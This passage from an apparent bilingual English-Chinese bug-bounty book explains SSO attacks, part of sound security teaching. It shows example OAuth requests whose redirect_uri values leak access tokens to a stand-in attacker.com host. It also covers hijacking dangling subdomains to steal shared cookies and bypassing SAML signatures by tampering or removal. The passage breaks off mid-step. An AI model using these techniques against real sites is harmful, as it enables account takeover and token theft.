identity.com/oauth/token?
client_id=CLIENT_ID
&client_secret=CLIENT_SECRET
&redirect_uri=https://example.com/callback
&code=abc123
    The identity provider will send back the
     access_token
    , which can be used to access the user’s information:
    身份提供者会发送回访问令牌，该令牌可用于访问用户信息：
https://example.com/callback?#access_token=xyz123
    A service provider might, for instance, initiate a request to the identity provider for an access token to access the user’s email. Then it could use the email retrieved from the identity provider as proof of the user’s identity to log the user in to the account registered with the same email address.
    例如，服务提供者可能会向身份提供者发起请求，以获取访问令牌来访问用户的电子邮件。然后，它可以使用从身份提供者检索到的电子邮件作为用户身份的证明，将用户登录到使用相同电子邮件地址注册的帐户中。
    OAuth Vulnerabilities
    Sometimes attackers can bypass OAuth authentication by stealing critical OAuth tokens through open redirects. Attackers do this by manipulating the
     redirect_uri
    parameter to steal the
     access_token
    from the victim’s account.
    攻击者有时可以通过开放式重定向窃取关键的OAuth令牌来绕过OAuth身份验证。攻击者通过操纵redirect_uri参数来窃取受害者账户中的access_token来实现这一点。
    The
     redirect_uri
    determines where the identity provider sends critical pieces of information like the
     access_token
    . Most major identity providers, therefore, require service providers to specify an allowlist of URLs to use as the
     redirect_uri
    . If the
     redirect_uri
    provided in a request isn’t on the allowlist, the identity provider will reject the request. The following request, for example, will be rejected if only
     example.com
    subdomains are allowed:
    重定向URI确定身份提供者发送访问令牌等关键信息的位置。因此，大多数主要的身份提供者要求服务提供者指定允许使用作为重定向URI的URL的白名单。如果请求中提供的重定向URI不在白名单上，身份提供者将拒绝该请求。例如，如果仅允许example.com子域，则将拒绝以下请求：
client_id=CLIENT_ID
&response_type=code
&state=STATE
&redirect_uri=https://attacker.com
&scope=email
    But what if an open redirect vulnerability exists within one of the allowlisted
     redirect_uri
    URLs? Often,
     access_token
    s are communicated via a URL fragment, which survives all cross-domain redirects. If an attacker can make the OAuth flow redirect to the attacker’s domain in the end, they can
    steal the
     access_token
    from the URL fragment and gain access to the user’s account.
    但是，如果其中一个明确允许的redirect_uri URL中存在开放重定向漏洞怎么办？通常，access_token通过URL fragment进行传递，它可以在所有跨域重定向中生存。如果攻击者最终可以让OAuth流程重定向到攻击者的域，他们可以从URL fragment中窃取access_token并获取用户账户的访问权限。
    One way of redirecting the OAuth flow is through a URL-parameter-based open redirect. For example, using the following URL as the
     redirect_uri
    通过基于URL参数的开放式重定向是重定向OAuth流程的一种方法。例如，使用以下URL作为redirect_uri。
redirect_uri=https://example.com/callback?next=attacker.com
    will cause the flow to redirect to the callback URL first
    将会导致流向首先重定向到回调URL。
https://example.com/callback?next=attacker.com#access_token=xyz123
    and then to the attacker’s domain:
    然后进入攻击者的域。
https://attacker.com#access_token=xyz123
    The attacker can send the victim a crafted URL that will initiate the OAuth flow, and then run a listener on their server to harvest the leaked tokens:
    攻击者可以向受害者发送一个精心构造的URL来启动OAuth流程，然后在他们的服务器上运行监听器以收集泄漏的令牌：
identity.com/oauth?
client_id=CLIENT_ID
&response_type=code
&state=STATE
&redirect_uri=https://example.com/callback?next=attacker.com
&scope=email
    Another way of redirecting the OAuth flow is through a referer-based open redirect. In this case, the attacker would have to set up the referer header by initiating the OAuth flow from their domain:
    另一种重定向OAuth流程的方式是基于引荐者的开放式重定向。在这种情况下，攻击者必须通过从其域中启动OAuth流程来设置引荐者标头：
Click here to log in to example.com
    This will cause the flow to redirect to the callback URL first:
    这将导致流程首先重定向到回调URL：
https://example.com/callback?#access_token=xyz123
    Then it would redirect to the attacker’s domain via the referer:
    那么它将通过引用者重定向到攻击者的域名：
https://attacker.com#access_token=xyz123
    Even when attackers can’t find an open redirect on the OAuth endpoint itself, they can still smuggle the tokens offsite if they can find an
     open redirect chain
    . For example, let’s say the
     redirect_uri
    parameter permits only further redirects to URLs that are under the
     example.com
    domain. If attackers can find an open redirect within that domain, they can still steal OAuth tokens via redirects. Let’s say an unfixed open redirect is on the logout endpoint of
     example.com
    :
    即使攻击者无法在OAuth端点本身上找到一个开放的重定向，如果他们可以找到一个开放的重定向链，他们仍然可以将令牌带离现场。例如，假设redirect_uri参数仅允许进一步重定向到example.com域下的URL。如果攻击者可以在该域内找到一个开放的重定向，他们仍然可以通过重定向窃取OAuth令牌。例如，假设在example.com的注销端点上存在一个未修复的开放式重定向：
https://example.com/logout?next=attacker.com
    By taking advantage of this open redirect, the attacker can form a chain of redirects to eventually smuggle the token offsite, starting with the following:
    通过利用这种开放式重定向，攻击者可以形成一系列重定向链，最终将令牌带到外部网站，从以下开始：
redirect_uri=https://example.com/callback?next=example.com/logout?next=attacker.com
    This
     redirect_uri
    will first cause the flow to redirect to the callback URL:
    这个 redirect_uri 将先使流程重定向到回调 URL：
https://example.com/callback?next=example.com/logout?next=attacker.com#access_token=xyz123
    Then to the logout URL vulnerable to open redirect:
    然后到注销URL容易受到开放重定向攻击:
https://example.com/logout?next=attacker.com#access_token=xyz123
    Then it will redirect to the attacker’s domain. The attacker can harvest the access token via their server logs, and access the user’s resources via the stolen token:
    然后它将重定向到攻击者的域名。攻击者可以通过服务器日志收集访问令牌，并通过窃取的令牌访问用户资源。
https://attacker.com#access_token=xyz123
    Besides stealing access tokens via an open redirect, long-lived tokens that don’t expire are also a major OAuth vulnerability. Sometimes tokens aren’t invalidated periodically and can be used by attackers long after they are stolen, and remain valid even after password reset. You can test for these issues by using the same access tokens after logout and after password reset.
    除了通过开放重定向窃取访问令牌外，长期不过期的令牌也是OAuth的一个重大漏洞。有时候令牌不会定期失效，攻击者可以在盗窃后长期使用它们，即使密码重置后仍然有效。您可以通过在注销和密码重置后使用相同的访问令牌来测试这些问题。
    Hunting for Subdomain Takeovers
    Let’s start your hunt for SSO vulnerabilities by finding some subdomain takeovers. The best way to reliably discover subdomain takeovers is to build a system that monitors a company’s subdomains for takeovers. But before you do that, let’s look at how you can search for subdomain takeovers manually.
    让我们开始搜索 SSO 漏洞，找到一些子域接管。可靠地发现子域接管的最佳方法是构建一个监控公司子域的系统以寻找接管。但是在这之前，让我们看看您如何手动搜索子域接管。
    Step 1: List the Target’s Subdomains
    First, you need to build a list of all the known subdomains of your target. This can be done using tools mentioned in
     Chapter 5
    . Next, use a screenshot application like EyeWitness or Snapper to see what is hosted on each subdomain.
    首先，您需要建立一个包含目标所有已知子域的列表。可以使用第5章提到的工具完成此操作。接下来，使用像EyeWitness或Snapper这样的截图应用程序，查看每个子域托管的内容。
    Step 2: Find Unregistered Pages
    Look for third-party pages indicating that the page isn’t registered. For example, if the third-party page is hosted on GitHub Pages, you should see something like
     Figure 20-3
    on the subdomain.
    寻找第三方页面，查看是否指示该页面尚未注册。例如，如果第三方页面托管在GitHub页面上，您应该在子域上看到类似于Figure 20-3的东西。
    Even if you’ve found a dangling CNAME, not all third-party hosting providers are vulnerable to takeovers. Some providers employ measures to verify the identity of users, to prevent people from registering pages associated with CNAME records. Currently, pages hosted on AWS, Bitbucket, and GitHub are vulnerable, whereas pages on Squarespace and Google Cloud
    are not. You can find a full list of which third-party sites are vulnerable on EdOverflow’s page on the topic (
     https://github.com/EdOverflow/can-i-take-over-xyz/
    ). You can find a list of page signatures that indicate an unregistered page there too.
    即使您已找到了悬挂的CNAME，不是所有第三方托管提供商都容易被接管。一些提供商采用措施来验证用户身份，以防止人们注册与CNAME记录相关的页面。目前，AWS、Bitbucket和GitHub上托管的页面易受攻击，而Squarespace和Google Cloud上的页面则不受影响。您可以在EdOverflow关于此主题的页面上（https://github.com/EdOverflow/can-i-take-over-xyz/）找到哪些第三方站点易受攻击的完整列表。您也可以在那里找到指示未注册页面的页面签名列表。
       Figure 20-3
      : An indicator that this page hosted on GitHub Pages is unclaimed
      图20-3：指示此页面托管在GitHub Pages上未被声明的指示。
    Step 3: Register the Page
    Once you’ve determined that the page is vulnerable to takeovers, you should try to register it on the third-party site to confirm the vulnerability. To register a page, go to the third-party site and claim the page as yours; the actual steps required vary by third-party provider. Host a harmless proof-of-concept page there to prove the subdomain takeover, such as a simple HTML page like this one:
    一旦确定页面容易被接管，你应该尝试在第三方网站上注册以确认此漏洞。要注册一个页面，请前往第三方网站并声明该页面为您的所有权；具体步骤因第三方供应商而异。在第三方网站上托管一个无害的概念验证页面，以证明子域接管，例如这样一个简单的HTML页面：
Subdomain Takeover by Vickie Li.
    Make sure to keep the site registered until the company mitigates the vulnerability by either removing the dangling DNS CNAME or by reclaiming the page on the third-party service. If you don’t, a malicious attacker might be able to take over the subdomain while the bug report is being processed.
    确保在公司解决漏洞之前，保持站点注册，可以通过删除悬空的DNS CNAME或在第三方服务上重新获取页面来解决漏洞。如果不这样做，则在漏洞报告正在处理时，恶意攻击者可能会接管子域。
    You might be able to steal cookies with the subdomain takeover if the site uses cookie-sharing SSO. Look for cookies that can be sent to multiple subdomains in the server’s responses. Shared cookies are sent with the
     Domain
    attribute specifying the parents of subdomains that can access the cookie:
    如果该网站使用共享 Cookie 的单点登录（SSO）功能，并且在服务器的响应中寻找可发送到多个子域的 Cookie，则可以通过子域接管来窃取 Cookie。共享 Cookie 是通过指定可以访问该 Cookie 的子域的父域作为 Domain 属性来发送的。
Set-Cookie: cookie=abc123; Domain=example.com; Secure; HttpOnly
    Then, you can log in to the legitimate site, and visit your site in the same browser. You can monitor the logs of your newly registered site to determine whether your cookies were sent to it. If the logs of your newly
    registered site receive your cookies, you have found a subdomain takeover that can be used to steal cookies!
    然后，您可以登录到合法网站，并在同一浏览器中访问您的网站。您可以监视您新注册的网站的日志，以确定是否将您的Cookie发送到该网站。如果您新注册的网站的日志接收到您的Cookie，则表示您发现了可以用来窃取Cookie的子域接管！
    Even if the subdomain takeover you’ve found cannot be used to steal shared-session cookies, it is still considered a vulnerability. Subdomain takeovers can be used to launch phishing attacks on a site’s users, so you should still report them to the organization!
    即使您找到的子域接管不能用于窃取共享会话Cookie，它仍被视为漏洞。 子域接管可以用于对网站用户发起钓鱼攻击，因此您仍应向组织报告它们！
    Monitoring for Subdomain Takeovers
    Instead of manually hunting for subdomain takeovers, many hackers build a monitoring system to continuously scan for them. This is useful because sites update their DNS entries and remove pages from third-party sites all the time. You never know when a site is going to be taken down and when a new dangling CNAME will be introduced into your target’s assets. If these changes lead to a subdomain takeover, you can find it before others do by routinely scanning for takeovers.
    许多黑客不再手动搜索子域劫持，而是建立一个监控系统来持续扫描。这非常有用，因为网站会不断更新其DNS条目，并从第三方网站中移除页面。你永远不知道网站何时会被关闭，何时会引入新的悬空CNAME到你的目标资产中。如果这些变化导致了子域劫持，你可以通过定期扫描寻找劫持，比其他人更早发现它。
    To create a continuous monitoring system for subdomain takeovers, you’ll simply need to automate the process I described for finding them manually. In this section, I’ll introduce some automation strategies and leave the actual implementation up to you:
    要创建一个持续的子域接管监控系统，您只需要自动化我手动搜索它们的过程。在本节中，我将介绍一些自动化策略，实际实现则由您来完成。
      Compile a list of subdomains that belong to the target organization
    编制属于目标组织的子域名列表。
    Scan the target for new subdomains once in a while to monitor for new subdomains. Whenever you discover a new service, add it to this list of monitored subdomains.
    定期扫描目标，以监测新的子域名。每当发现新的服务时，请将其添加到受监控的子域名列表中。
      Scan for subdomains on the list with CNAME entries that point to pages hosted on a vulnerable third-party service
    扫描列表上的子域名，这些子域名具有CNAME条目，指向托管在漏洞的第三方服务上的页面。
    To do this, you’ll need to resolve the base DNS domain of the subdomain and determine if it’s hosted on a third-party provider based on keywords in the URL. For example, a subdomain that points to a URL that contains the string
     github.io
    is hosted on GitHub Pages. Also determine whether the third-party services you’ve found are vulnerable to takeovers.
    If the target’s sites are exclusively hosted on services that aren’t vulnerable to subdomain takeovers, you don’t have to scan them for potential takeovers.
    为了实现这一点，您需要解析子域的基本DNS域，并根据URL中的关键字确定它是否托管在第三方提供商上。例如，指向包含字符串github.io的URL的子域将托管在GitHub Pages上。还要确定您找到的第三方服务是否容易被接管。如果目标站点仅托管在不易受子域接管攻击的服务上，您无需扫描它们以寻找潜在的接管攻击。
      Determine the signature of an unregistered page for each external service
    为每个外部服务确定未注册页面的签名。
    Most services will have a custom 404 Not Found page that indicates the page isn’t registered. You can use these pages to detect a potential takeover. For example, a page that is hosted on GitHub pages is vulnerable if the string
     There isn't a GitHub Pages site here
    is returned in the HTTP response. Make a request to the third-party hosted subdomains and scan the response for these signature strings. If one of the signatures is detected, the page might be vulnerable to takeover.
    大多数服务都将拥有定制的404页面，指示网页未注册。您可以使用这些页面来检测潜在的接管。例如，在Github页面上托管的页面如果返回HTTP响应中的字符串"There isn't a GitHub Pages site here"是容易受攻击的。请求第三方托管的子域并扫描响应以检查这些签名字符串。如果检测到其中一个签名，那么这个页面可能容易被接管。
    One way of making this hunting process even more efficient is to let your automation solution run in the background, notifying you only after it finds a suspected takeover. You can set up a cron job to run the script you’ve
    created regularly. It can alert you only if the monitoring system detects something fishy:
    让自动化解决方案在后台运行并在发现可疑接管后通知您，是进一步提高狩猎过程效率的一种方式。您可以设置 cron 作业定期运行创建的脚本。只有在监控系统检测到可疑情况时，它才会向您发出警报。
30 10 * * * cd /Users/vickie/scripts/security; ./subdomain_takeover.sh
    After the script notifies you of a potential subdomain takeover, you can verify the vulnerability by registering the page on the external service.
    脚本通知您可能存在子域劫持的情况后，您可以通过在外部服务上注册页面来验证漏洞。
    Hunting for SAML Vulnerabilities
    Now let’s discuss how you can find faulty SAML implementations and use them to bypass your target’s SSO access controls. Before you dive in, be sure to confirm that the website is indeed using SAML. You can figure this out by intercepting the traffic used for authenticating to a site and looking for XML-like messages or the keyword
     saml
    . Note that SAML messages aren’t always passed in plain XML format. They might be encoded in base64 or other encoding schemes.
    现在让我们讨论如何找到有缺陷的 SAML 实现，并使用它们绕过目标的SSO访问控制。在深入研究之前，请务必确认网站确实在使用 SAML。您可以通过拦截用于身份验证站点的流量，并查找类似于 XML 的消息或关键字 SAML 来弄清楚。请注意，SAML 消息并不总是以纯 XML 格式传递。它们可能会以 base64 或其他编码方案进行编码。
    Step 1: Locate the SAML Response
    First and foremost, you need to locate the SAML response. You can usually do this by intercepting the requests going between the browser and the service provider using a proxy. The SAML response will be sent when the user’s browser is logging into a new session for that particular service provider.
    首先，您需要定位SAML响应。您通常可以通过使用代理截获浏览器和服务提供商之间的请求来完成此操作。当用户的浏览器登录该特定服务提供商的新会话时，将发送SAML响应。
    Step 2: Analyze the Response Fields
    Once you’ve located the SAML response, you can analyze its content to see which fields the service provider uses for determining the identity of the user. Since the SAML response is used to relay authentication data to the service provider, it must contain fields that communicate that information. For example, look for field names like
     username
    ,
     email address
    ,
     userID
    , and so on. Try tampering with these fields in your proxy. If the SAML message lacks a signature, or if the signature of the SAML response isn’t verified at all, tampering with the message is all you need to do to authenticate as someone else!
    一旦找到了 SAML 响应，您可以分析其内容，看看服务提供商用于确定用户身份的哪些字段。由于 SAML 响应用于将认证数据传递给服务提供商，因此必须包含传达该信息的字段。例如，查找字段名称，例如用户名、电子邮件地址、用户 ID 等。尝试在代理中篡改这些字段。如果 SAML 消息缺少签名，或者根本不验证 SAML 响应的签名，则篡改消息就足以作为其他人进行认证！
    Step 3: Bypass the Signature
    If the SAML message you’re tampering with does have a signature, you can try a few strategies to bypass it.
    如果你篡改的SAML消息具有签名，你可以尝试一些策略来绕过它。
    If the signatures are verified only when they exist, you could try removing the signature value from the SAML response. Sometimes this is the only
    action required to bypass security checks. You can do this in two ways. First, you can empty the signature field:
    如果只有存在签名时才会验证签名，您可以尝试从SAML响应中删除签名值。有时这是绕过安全检查所必需的唯一操作。您可以用两种方式来实现。首先，您可以清空签名字段：